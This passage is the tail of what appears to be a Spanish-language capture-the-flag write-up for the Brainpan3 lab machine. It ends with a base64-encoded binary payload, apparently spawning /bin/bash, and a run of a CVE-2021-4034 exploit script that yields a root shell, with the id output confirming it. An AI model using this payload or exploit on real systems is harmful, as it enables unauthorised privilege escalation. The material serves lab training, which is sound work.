+APQAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAD2AAAABQAAAPQAAAAGAAAA9AAAAAoAAAAAAAAA
+CwAAAAAAAAAAAAAAAAAAAAAAMdtqF1jNgGoLWJlSZmgtY4nnaC9zaABoL2JpbonjUugKAAAAL2Jp
+bi9iYXNoAFdTieHNgA==</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente ejecutamos el exploit y nos devuelve una bash como el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.  
+[+] Calling execve()
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+192.168.100.64 
+</span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
